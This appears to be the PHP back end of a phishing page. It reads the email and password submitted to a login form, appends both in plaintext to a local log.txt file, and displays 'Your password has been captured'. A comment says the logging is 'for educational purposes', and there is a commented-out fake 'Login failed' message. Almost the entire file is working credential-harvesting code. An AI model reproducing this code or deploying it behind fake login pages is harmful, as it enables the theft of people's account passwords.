<?php
$email = $_POST['email'];
    $password = $_POST['password'];
    
    // Log the captured data (for educational purposes)
    $file = fopen("log.txt", "a");
    fwrite($file, "Email: $email | Password: $password\n");
    fclose($file);
    
    // echo "Login failed. Please try again.";

?>

<h1 align-center> Your password has been captured</h1>

<!-- <style>
  @keyframes fadeIn {
    0% { opacity: 0; }
    100% { opacity: 1; }
  }
</style> -->




<?php

?>